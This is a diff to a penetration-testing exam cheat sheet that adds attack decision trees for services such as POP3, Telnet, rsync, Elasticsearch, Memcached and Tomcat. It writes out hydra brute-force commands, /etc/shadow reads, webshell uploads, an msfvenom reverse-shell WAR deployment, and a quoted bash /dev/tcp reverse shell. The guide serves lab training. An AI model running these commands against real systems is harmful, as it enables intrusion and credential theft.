@@ -2447,18 +2447,28 @@ searchsploit exim ; searchsploit sendmail          # old MTAs have RCEs (e.g. Ex
 
 **Leads to:** usernames → `[AD-QUICK]` / spray `[CREDENTIALS-QUICK]`; version → `[EXPLOIT-RESEARCH]`.
 
-## [ENUM-POP-IMAP]  Ports 110/143 (+995/993 TLS) — POP3 / IMAP (mailboxes)
+## [ENUM-POP-IMAP]  Ports 110/143 (+995/993 TLS) — POP3 / IMAP (mailboxes) — FULL CHAIN
 **What it is:** read mail *with creds*. Mailboxes often contain **passwords, password-reset links, internal info** → reuse.
+### 🗺️ Decision tree
+```
+110/143 open → do you HAVE a credential (found anywhere)? →
+  yes → log in (nc/openssl/curl) → read EVERY mail →
+     mail contains a password / reset link / internal hint? → REUSE it everywhere → [CREDENTIALS-QUICK]
+     nothing useful → note the addresses (they're valid usernames) → feed spraying/AD
+  no credential → this is a PAYOFF service, not a way in →
+     got a username list (finger/SMTP/web)? AND a password policy that's safe? →
+        brute ONE known user (hydra pop3/imap, slow) → login
+     else → come back once another service gives you creds
+```
 ```bash
 nmap -p110,143,993,995 -sCV $IP                    # version + capabilities
-# connect + read (plaintext):
-nc -nv $IP 110                                       # POP3:  USER <u>  /  PASS <p>  /  LIST  /  RETR 1
+nc -nv $IP 110                                       # POP3:  USER <u> / PASS <p> / LIST / RETR 1
 openssl s_client -connect $IP:995 -quiet            # POP3S (TLS)
 curl -k "imaps://$IP" --user '<u>:<p>'               # IMAP over TLS
-# in IMAP (143):  a LOGIN <u> <p>  /  a LIST "" "*"  /  a SELECT INBOX  /  a FETCH 1 BODY[]
+# in IMAP (143):  a LOGIN <u> <p> / a LIST "" "*" / a SELECT INBOX / a FETCH 1 BODY[]
+hydra -l <u> -P rockyou.txt pop3://$IP                # brute (last resort, KNOWN user)
 ```
-- **Brute (last resort, known user):** `hydra -l <u> -P rockyou.txt pop3://$IP` / `imap://$IP`.
-- **Leads to:** creds/hints inside emails → reuse `[CREDENTIALS-QUICK]`.
+- **Leads to:** creds/hints inside emails → reuse `[CREDENTIALS-QUICK]`; valid addresses → user list for spraying.
 
 ## [ENUM-DNS]  Port 53 — DNS (name lookups) — FULL CHAIN  → also `[TECH-DNS]`
 **What it is:** the phone book (names ↔ IPs). Jackpot = a **zone transfer** (dumps every internal hostname at once). On AD, DNS reveals the Domain Controllers.
@@ -2509,8 +2519,25 @@ whatweb http://$IP        # identify the tech stack (server, CMS, frameworks)
 curl -sI http://$IP       # show just the response headers (server type, redirects, cookies)
 # then: view page source · read /robots.txt · brute-force hidden directories · brute-force vhosts
 ```
-**Look for:** the CMS and its version (→ search for exploits), any redirect to a hostname (add it to `/etc/hosts`, then fuzz it as a "vhost"), login pages, file-upload pages, and URL parameters (`?id=1`) to test for injection.
-**Where it leads:** SQL injection / file inclusion / file upload / command injection / a known-version exploit → your first shell. **Start at `[WEB-QUICK]` in Volume 2.**
+### 🗺️ Decision tree (what you find → which VOL-2 attack to open)
+```
+web port open → whatweb + curl -sI + feroxbuster + view-source + /robots.txt →
+  it's a named CMS/product (version)? → searchsploit it + [VERSION-VULN-MAP] →
+       WordPress → wpscan + plugin exploits ; Tomcat → [ENUM-AJP] ; Drupal/Joomla → known RCE
+  a LOGIN page?                → default/weak creds → SQLi auth bypass (admin'-- -) → [WEB-AUTHBYPASS]
+  a FILE-UPLOAD page?          → webshell past the filter → [WEB-UPLOAD]
+  a URL param ?id=1 / ?page=   → test it:
+       error on quote / UNION works → [WEB-LFI] isn't it; it's SQLi → [SQLI]
+       ?page=/file / ?file= reads a file → [WEB-LFI] (→ RCE via log poison / php filter)
+       input echoed into a command → [WEB-CMDINJ] ; into a template (49 from {{7*7}}) → [WEB-SSTI]
+       server fetches a URL you give → [WEB-SSRF] ; XML parsed → [WEB-XXE]
+  a redirect to a HOSTNAME?    → add to /etc/hosts → fuzz vhosts (ffuf -H "Host: FUZZ.domain")
+  a 403/401 on a dir?          → [WEB-403-BYPASS] ; HTTP PUT allowed? → [WEB-PUT-WEBDAV]
+  exposed /.git ?              → [ENUM-GIT] (dump source + secrets)
+  NOTHING obvious?             → re-read source/JS/comments, fuzz params, deeper dir brute → don't leave web early
+```
+**Look for:** the CMS and its version (→ exploits), redirects to a hostname (→ vhost fuzz), login/upload pages, and URL parameters to test for injection.
+**Where it leads:** SQLi / LFI / upload / cmd-injection / SSTI / a known-version exploit → your first shell. **The full method + every attack is `[WEB-QUICK]` → the `[WEB-*]` sections in Volume 2.**
 
 ## [ENUM-SMB]  Ports 139/445 — SMB (Windows file sharing)  → also `[TECH-SMB]`
 **What it is:** Windows file-and-printer sharing. On a Windows/AD network it's the workhorse: you can sometimes list shared folders and usernames **without any password** ("null session"), test whether creds work, move between machines, and loot files left in shares.
@@ -3392,8 +3419,18 @@ hydra -P rockyou.txt vnc://$IP                       # brute the password (last 
 | ports 5901/5902 instead | display :1/:2 → VNC port = 5900 + display number |
 **Where it leads:** a graphical session (often an already-logged-in, sometimes admin, user) → open a terminal → `[LINUX-PRIVESC]` / `[WINDOWS-PRIVESC]`.
 
-## [ENUM-IPMI]  Port 623/UDP — IPMI (server management)
+## [ENUM-IPMI]  Port 623/UDP — IPMI (server management) — FULL CHAIN
 **What it is:** a "lights-out" management interface on server hardware. Its big weakness: **IPMI 2.0 will hand you a password hash for any valid user before you even authenticate** (CVE-2013-4786) → crack it offline.
+### 🗺️ Decision tree
+```
+623/udp open (remember: -sU!) → check cipher-zero + version →
+  cipher-zero bypass works? → ipmitool -C 0 → list/add users, no password needed → admin
+  else → dump the RAKP hash (MSF ipmi_dumphashes) →
+     hash cracks (hashcat -m 7300)? → you have controller admin creds →
+        REUSE those creds on the OS (SSH/web/SMB) → [CREDENTIALS-QUICK]
+     won't crack → try DEFAULT creds (ADMIN/ADMIN, root/calvin, admin/admin) →
+        work → admin ; none → this box isn't the IPMI path, move on
+```
 ```bash
 nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero $IP     # detect + check for the cipher-zero auth bypass
 # dump password hashes (Metasploit — your ONE MSF box, or just to grab the hash):
@@ -3508,96 +3545,162 @@ python3 evil-cups.py <KALI-IP> $IP "bash -c 'bash -i >& /dev/tcp/<KALI-IP>/443 0
 
 **Leads to:** rarely the main path on OSCP. Best realistic yield = **creds leaking from a printer's device URI / config** → `[CREDENTIALS-QUICK]`. The 2024 RCE is powerful but needs UDP cups-browsed + a vulnerable version + (usually) a printing victim — so **recognise it, try it if the pieces fit, but don't marry it.** On boxes like PG Pelican, 631 was pure noise.
 
-## [ENUM-TELNET]  Port 23 — Telnet (cleartext remote login)
+## [ENUM-TELNET]  Port 23 — Telnet (cleartext remote login) — FULL CHAIN
 **What it is:** ancient remote shell, **cleartext**. Occasionally wide open with default/no creds, or the banner leaks the device/OS.
+### 🗺️ Decision tree
+```
+23 open → read the banner (telnet $IP 23) →
+  banner names a device/OS/product? → try its DEFAULT creds (root/blank, admin/admin, vendor defaults) →
+     login works?  → you have a shell → stabilize → loot → [LINUX-PRIVESC]
+     no default?   → is the product/version exploitable? ([VERSION-VULN-MAP]) → yes: run it
+  no banner / no default → do you KNOW a username (from finger/SMTP/web)? →
+     yes → brute just that user (hydra, slow) → login
+     no  → telnet is a dead end here; move on (don't full-rockyou-brute blind)
+  ANY password you find → REUSE on SSH/SMB/other (cleartext = easy capture)
+```
 ```bash
 nmap -p23 -sCV --script "telnet-ntlm-info,telnet-encryption" $IP
 telnet $IP 23                      # read banner; try: root/(blank), admin/admin, device defaults
-hydra -l <user> -P rockyou.txt telnet://$IP -t 4    # brute (last resort, known user)
+hydra -l <user> -P rockyou.txt telnet://$IP -t 4    # brute (last resort, KNOWN user only)
 ```
-- **Decision:** banner → device/OS → default creds → login; else version exploit; else brute. Any password → **reuse** on SSH/other.
 - **Leads to:** a shell → `[LINUX-PRIVESC]`; creds → `[CREDENTIALS-QUICK]`.
 
-## [ENUM-FINGER]  Port 79 — Finger (user info)
-**What it is:** leaks **usernames + who's logged in**. Pure user-enumeration.
+## [ENUM-FINGER]  Port 79 — Finger (user info) — FULL CHAIN
+**What it is:** leaks **usernames + who's logged in**. Pure user-enumeration (feeds spraying/SSH).
+### 🗺️ Decision tree
+```
+79 open → finger @$IP (list logged-in users) →
+  got usernames? → build a user list →
+     feed it to: AS-REP/Kerberoast (if AD), password spray, SSH guessing → [CREDENTIALS-QUICK]
+  empty / filtered? → brute common names (root/admin/bin/daemon/<site names>) →
+     still nothing → old Solaris trick: finger 'a b c d e f g h'@$IP (dumps all) →
+     still nothing → note it, move on
+```
 ```bash
 finger @$IP ; finger root@$IP                        # list users / query one
-# brute usernames:
-for u in root admin bin daemon <names>; do finger $u@$IP; done
+for u in root admin bin daemon <names>; do finger $u@$IP; done   # brute usernames
 # metasploit: auxiliary/scanner/finger/finger_users  (or finger-user-enum.pl)
 ```
-- **Leads to:** a user list → spray / SSH-guess `[CREDENTIALS-QUICK]`. (Old Solaris boxes: `finger 'a b c d e f g h'@$IP` dumps all.)
+- **Leads to:** a user list → spray / SSH-guess `[CREDENTIALS-QUICK]`.
 
-## [ENUM-TFTP]  Port 69/UDP — TFTP (trivial file transfer, NO auth)
-**What it is:** UDP file transfer with **no authentication** — you can GET/PUT files if you know (or guess) the name. Often used by routers/VoIP for configs (which hold creds).
-```bash
-nmap -sU -p69 -sV $IP
-tftp $IP                           # then:  get <file>   /   put <file>
-#   common grabs: config files, backups, running-config, .conf — often contain creds
-# brute filenames:  nmap -sU -p69 --script tftp-enum $IP
+## [ENUM-TFTP]  Port 69/UDP — TFTP (trivial file transfer, NO auth) — FULL CHAIN
+**What it is:** UDP file transfer with **no authentication** — GET/PUT files if you know (or guess) the name. Routers/VoIP store configs here (which hold creds). TFTP **can't list**, so you must guess names.
+### 🗺️ Decision tree
 ```
-- **Decision:** can you GET a known config? → loot creds. Can you PUT? → stage a file (e.g. into a web/tftp root). No listing (TFTP can't list) → guess common names.
-- **Leads to:** config creds → reuse; file write → foothold (rare).
+69/udp open → try to GET a known/guessed config name →
+  GET works? → loot the config for creds/keys → REUSE → [CREDENTIALS-QUICK]
+  GET fails? → brute common names (nmap tftp-enum; try running-config, startup-config,
+               *.conf, backup, sysconfig) →
+     found one → loot it
+     none → can you PUT? →
+        yes + you know a useful path (web root / tftp root) → stage a webshell/file → foothold
+        no  → TFTP is a dead end here; move on
+```
+```bash
+nmap -sU -p69 -sV $IP ; nmap -sU -p69 --script tftp-enum $IP
+tftp $IP                           # then:  get <file>  /  put <file>
+#   common grabs: running-config, startup-config, *.conf, backup — often contain creds
+```
+- **Leads to:** config creds → reuse; writable + known path → foothold (rare).
 
-## [ENUM-NTP]  Port 123/UDP — NTP (time)
-**What it is:** time service. Minor on OSCP — can leak internal **hosts** (monlist) and the system **time** (useful for Kerberos clock-sync).
+## [ENUM-NTP]  Port 123/UDP — NTP (time) — FULL CHAIN
+**What it is:** time service. Minor on OSCP, but two real uses: leaks internal **hosts** (monlist) and gives the DC's **time** (fixes Kerberos clock skew).
+### 🗺️ Decision tree
+```
+123/udp open → ntpq peers / ntp-monlist →
+  monlist returns IPs? → those are internal hosts → note them for PIVOT targets
+  doing AD and hitting KRB_AP_ERR_SKEW? → sudo ntpdate $IP to sync your clock → retry Kerberos
+  nothing useful → note + move on (NTP is rarely the path itself)
+```
 ```bash
 nmap -sU -p123 --script "ntp-info,ntp-monlist" $IP
 ntpq -c readlist $IP ; ntpq -c peers $IP              # peers may reveal internal IPs
-sudo ntpdate $IP                                      # sync your clock to it (for Kerberos) 
+sudo ntpdate $IP                                      # sync your clock to it (for Kerberos)
 ```
 - **Leads to:** internal host hints (pivot); clock sync for `[ENUM-KERBEROS]`.
 
-## [ENUM-RSYNC]  Port 873 — rsync (file sync, often NO auth)
+## [ENUM-RSYNC]  Port 873 — rsync (file sync, often NO auth) — FULL CHAIN
 **What it is:** file-sync daemon. Frequently exposes **modules (shares)** with no auth → read/write files (configs, keys, web root, even `/`).
+### 🗺️ Decision tree
+```
+873 open → list modules (rsync --list-only rsync://$IP/) →
+  modules listed? →
+     readable? → DOWNLOAD it → mine for creds/keys/source → [CREDENTIALS-QUICK]
+     writable? AND maps a useful path? →
+        maps web root  → upload a webshell → browse it → RCE
+        maps a home    → upload ~/.ssh/authorized_keys → ssh in
+        maps /         → read /etc/shadow, or write a cron/SUID → root
+  module needs auth? → try creds you already have (rsync://user@$IP/<module>/)
+  no modules → move on
+```
 ```bash
 nmap -p873 -sV --script "rsync-list-modules" $IP
 rsync -av --list-only rsync://$IP/                    # list modules (shares)
-rsync -av rsync://$IP/<module>/ ./loot/               # DOWNLOAD a module → loot creds/keys/source
-rsync -av ./shell.php rsync://$IP/<module>/           # UPLOAD (if writable) → webshell / SSH key / cron
+rsync -av rsync://$IP/<module>/ ./loot/               # DOWNLOAD → loot
+rsync -av ./shell.php rsync://$IP/<module>/           # UPLOAD (if writable)
 rsync -av rsync://$IP/<module>/etc/shadow ./          # if a module maps '/', read anything
-# auth module:  rsync -av rsync://user@$IP/<module>/   (needs a password)
 ```
-- **Decision:** list modules → readable? loot. Writable + maps a useful path (web root / a home / `/`) → drop a webshell or SSH key → foothold.
 - **Leads to:** creds/keys → `[CREDENTIALS-QUICK]`; writable share → shell `[WEB-UPLOAD]`.
 
-## [ENUM-ELASTIC]  Ports 9200/9300 — Elasticsearch / Kibana
-**What it is:** a search/analytics DB with a **REST API, usually no auth**. Loot indices (often app data/creds); old versions have **RCE** (CVE-2014-3120 / CVE-2015-1427 Groovy).
+## [ENUM-ELASTIC]  Ports 9200/9300 — Elasticsearch / Kibana — FULL CHAIN
+**What it is:** a search/analytics DB with a **REST API, usually no auth**. Loot indices (app data/creds); old versions have **RCE**.
+### 🗺️ Decision tree
+```
+9200 open → curl http://$IP:9200 → read the VERSION →
+  version ≤ 1.1    → CVE-2014-3120 RCE (searchsploit elasticsearch)
+  version 1.3–1.4  → CVE-2015-1427 Groovy-sandbox RCE
+  version newer / unsure → no easy RCE → LOOT instead:
+     list indices (_cat/indices) → dump each (_search) → mine for creds/tokens/app data → REUSE
+  Kibana on 5601?  → check ITS version too (CVE-2018-17246 LFI→RCE on old Kibana)
+```
 ```bash
 curl -s http://$IP:9200                               # banner → VERSION (decides RCE)
 curl -s http://$IP:9200/_cat/indices?v                # list indices
 curl -s "http://$IP:9200/_search?pretty&size=100"     # dump data → mine for creds/tokens
-curl -s http://$IP:9200/<index>/_search?pretty
-# RCE on old versions:  ES 1.1 → CVE-2014-3120 ;  ES 1.3-1.4 → CVE-2015-1427 (Groovy sandbox)  [LOOK-UP searchsploit elasticsearch]
+# RCE: ES ≤1.1 → CVE-2014-3120 ; ES 1.3-1.4 → CVE-2015-1427 (Groovy)  [LOOK-UP searchsploit elasticsearch]
 ```
-- **Decision:** dump indices → creds? reuse. Version ≤ 1.4 → Groovy RCE. Kibana on 5601 → check its version too.
 - **Leads to:** app creds → reuse; old version → RCE `[EXPLOIT-RESEARCH]`.
 
-## [ENUM-MEMCACHED]  Port 11211 — Memcached (cache, NO auth)
+## [ENUM-MEMCACHED]  Port 11211 — Memcached (cache, NO auth) — FULL CHAIN
 **What it is:** in-memory cache, usually **no auth**. Dump cached objects → **session tokens, creds, app data**.
+### 🗺️ Decision tree
+```
+11211 open → connect (nc $IP 11211) → stats items → stats cachedump <slab> 0 (list keys) →
+  keys present? → get <key> each (or memcdump/memccat to dump ALL) →
+     found a session token? → replay it in the app (cookie) → authenticated
+     found creds / app data? → REUSE → [CREDENTIALS-QUICK]
+  empty cache → note + move on
+```
 ```bash
 nmap -p11211 -sV --script "memcached-info" $IP
-# dump all keys then read them:
-nc -nv $IP 11211                                      # then:  stats  /  stats items  /  stats cachedump <slab> 0  /  get <key>
-memcdump --servers=$IP | while read k; do echo "$k:"; memccat --servers=$IP "$k"; done   # dump everything
+nc -nv $IP 11211            # then: stats / stats items / stats cachedump <slab> 0 / get <key>
+memcdump --servers=$IP | while read k; do echo "$k:"; memccat --servers=$IP "$k"; done   # dump all
 ```
 - **Leads to:** cached creds/sessions → reuse `[CREDENTIALS-QUICK]`.
 
-## [ENUM-AJP]  Port 8009 — AJP / Apache Tomcat (Ghostcat) ; Tomcat on 8080
-**What it is:** **AJP (8009)** is Tomcat's binary connector → **Ghostcat (CVE-2020-1938)** = read any file in the webapp (e.g. `WEB-INF/web.config` with creds) and sometimes RCE. **Tomcat on 8080** → the **Manager app** (`/manager/html`) deploys a `.war` = RCE.
+## [ENUM-AJP]  Port 8009 — AJP / Apache Tomcat (Ghostcat) ; Tomcat on 8080 — FULL CHAIN
+**What it is:** **AJP (8009)** is Tomcat's binary connector → **Ghostcat (CVE-2020-1938)** reads any file in the webapp (e.g. `WEB-INF/web.xml` with creds), sometimes RCE. **Tomcat on 8080** → the **Manager app** deploys a `.war` = RCE.
+### 🗺️ Decision tree
+```
+8009 (AJP) open? → Ghostcat (CVE-2020-1938) → read WEB-INF/web.xml →
+  web.xml leaks Manager creds? → go to the 8080 branch with them
+  no creds there → read other app files for secrets
+8080 (Tomcat) open? → browse / → find version + /manager/html →
+  Manager reachable? → try creds (web.xml-looted, or defaults tomcat/tomcat, admin/admin, tomcat/s3cret) →
+     login works? → deploy a malicious .war → browse it → RCE (reverse shell) ✅
+     no creds     → brute Manager (hydra http-get) OR Ghostcat-read web.xml first
+  no Manager → searchsploit the Tomcat version for a version-specific bug
+```
 ```bash
 # AJP / Ghostcat (8009):
 nmap -p8009 -sV $IP
-# CVE-2020-1938: read WEB-INF files  (searchsploit ghostcat / python PoC):
-#   python3 ghostcat.py -p 8009 $IP -f WEB-INF/web.xml        → creds/config
+#   python3 ghostcat.py -p 8009 $IP -f WEB-INF/web.xml        → creds/config  (searchsploit ghostcat)
 # Tomcat Manager (8080):
 curl -s http://$IP:8080/                                       # version in the error/title page
-# try default creds at /manager/html :  tomcat/tomcat, admin/admin, tomcat/s3cret
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI> LPORT=443 -f war -o sh.war
 curl -u tomcat:<pass> --upload-file sh.war "http://$IP:8080/manager/text/deploy?path=/sh"
 curl "http://$IP:8080/sh/"                                      # triggers the shell (nc -lvnp 443)
 ```
-- **Decision:** 8009 open → Ghostcat read `web.xml`/configs → creds → Manager login → deploy `.war` → RCE. 8080 Manager + creds → deploy `.war` → RCE.
 - **Leads to:** file read (creds) → Manager → `.war` deploy → shell.
 
 ## [ENUM-UNUSUAL-PORTS]  a generic method for any port you don't recognise
